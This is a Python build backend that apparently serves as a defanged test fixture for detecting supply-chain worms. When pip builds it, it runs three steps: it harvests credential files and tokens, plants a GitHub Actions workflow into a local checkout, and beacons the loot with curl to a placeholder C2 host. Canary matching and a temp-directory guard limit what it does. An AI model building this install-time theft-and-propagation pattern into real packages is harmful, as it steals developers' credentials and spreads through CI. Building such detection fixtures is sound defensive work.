"""BENIGN SYNTHETIC FIXTURE - the FLAWED twin's build backend.

A minimal PEP 517 backend written against the standard library alone, so the
fixture installs offline with `--no-build-isolation`.

The flaw is the first line of build_wheel(): running the harvest while pip is
building, which is the PyPI half of the cross-ecosystem worm class (CHAINDROP /
TrapDoor). It does the same three things the npm twin does, in the same order:

    harvest()  read the canary credential files, and the canary environment
    plant()    write a GitHub Actions workflow into the CHECKOUT pip was run
               from - the propagation stage, not a build artefact
    beacon()   send the harvested value to a C2 host

All three are defanged. The only credentials it can find are the random canary
nonces the probe planted; there is nothing real on the disk it is handed. The
workflow is a no-op `echo` in the probe's throwaway checkout. The C2 host is
under .invalid (RFC 2606), which no resolver answers, so without the probe's
loopback proxy the beacon cannot leave the machine.
"""

import base64
import hashlib
import os
import re
import subprocess
import tempfile
import zipfile

NAME = "cxg_fixture_credaccess_flawed"
VERSION = "1.0.0"
DIST = "%s-%s.dist-info" % (NAME, VERSION)
PKG = "cxg_credfixture"

CANARY = re.compile(r"CXGCANARY[0-9A-Z]+")
CRED_FILES = (".npmrc", ".aws/credentials", ".config/gh/hosts.yml")
CRED_ENV = ("NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "GH_TOKEN")

METADATA = (
    "Metadata-Version: 2.1\n"
    "Name: cxg-fixture-credaccess-flawed\n"
    "Version: %s\n"
    "Summary: Benign synthetic cxg fixture\n" % VERSION
)
WHEEL = ("Wheel-Version: 1.0\nGenerator: cxg-fixture\n"
         "Root-Is-Purelib: true\nTag: py3-none-any\n")

WORKFLOW = """# BENIGN SYNTHETIC FIXTURE - planted by a cxg test fixture.
# A real worm puts its exfiltration here. This one echoes.
name: cxg-fixture-planted
on: [push]
jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - run: echo %s
"""


def _here(*parts):
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), *parts)


def _read(*parts):
    with open(_here(*parts), "rb") as fh:
        return fh.read()


def _record_line(path, data):
    digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=")
    return "%s,sha256=%s,%d" % (path, digest.decode(), len(data))


def harvest():
    loot = []
    home = os.path.expanduser("~")
    for rel in CRED_FILES:
        try:
            with open(os.path.join(home, rel), encoding="utf-8",
                      errors="ignore") as fh:
                hit = CANARY.search(fh.read())
        except OSError:
            continue
        if hit:
            loot.append("%s=%s" % (rel, hit.group(0)))
    for name in CRED_ENV:
        value = os.environ.get(name, "")
        if CANARY.search(value):
            loot.append("%s=%s" % (name, value))
    return ";".join(loot) or "none"


def _under_tmp(path):
    """SAFETY GUARD, not part of the shape being reproduced.

    This fixture refuses to write anywhere but a temporary directory. Run
    outside the probe's lab - by a curious reader, or by a test runner pointed
    at the wrong path - it plants nothing rather than touching a real
    repository.
    """
    try:
        root = os.path.realpath(tempfile.gettempdir()) + os.sep
        return os.path.realpath(path).startswith(root)
    except OSError:
        return False


def find_checkout():
    """Walk $HOME for a git checkout.

    pip hands a build backend no INIT_CWD, so the PyPI half of this class goes
    looking: any directory under the developer's home with a .git in it is a
    repository whose CI can be made to run the next stage.
    """
    home = os.path.expanduser("~")
    for base, dirs, _files in os.walk(home):
        if base.count(os.sep) - home.count(os.sep) > 4:
            dirs[:] = []
            continue
        if ".git" in dirs:
            return base
    return None


def plant(blob):
    checkout = find_checkout()
    if not checkout or not _under_tmp(checkout):
        return
    try:
        directory = os.path.join(checkout, ".github", "workflows")
        os.makedirs(directory, exist_ok=True)
        with open(os.path.join(directory, "cxg-fixture-chaindrop.yml"), "w",
                  encoding="utf-8") as fh:
            fh.write(WORKFLOW % blob)
    except OSError:
        pass


def beacon(blob):
    try:
        subprocess.run(
            ["curl", "-s", "--max-time", "5", "-o", "/dev/null",
             "http://cxg-fixture-c2.invalid/collect?d=%s" % blob],
            check=False, timeout=15)
    except Exception:
        pass


def get_requires_for_build_wheel(config_settings=None):
    return []


def _write_metadata(directory):
    os.makedirs(os.path.join(directory, DIST), exist_ok=True)
    with open(os.path.join(directory, DIST, "METADATA"), "w") as fh:
        fh.write(METADATA)
    with open(os.path.join(directory, DIST, "WHEEL"), "w") as fh:
        fh.write(WHEEL)
    return DIST


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    return _write_metadata(metadata_directory)


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    # The payload: pip is running this.
    blob = harvest()
    plant(blob)
    beacon(blob)

    members = {
        "%s/__init__.py" % PKG: _read(PKG, "__init__.py"),
        "%s/METADATA" % DIST: METADATA.encode(),
        "%s/WHEEL" % DIST: WHEEL.encode(),
    }
    lines = [_record_line(path, data) for path, data in members.items()]
    lines.append("%s/RECORD,," % DIST)
    members["%s/RECORD" % DIST] = ("\n".join(lines) + "\n").encode()

    wheel_name = "%s-%s-py3-none-any.whl" % (NAME, VERSION)
    with zipfile.ZipFile(os.path.join(wheel_directory, wheel_name), "w") as zf:
        for path, data in members.items():
            zf.writestr(path, data)
    return wheel_name


build_sdist = None
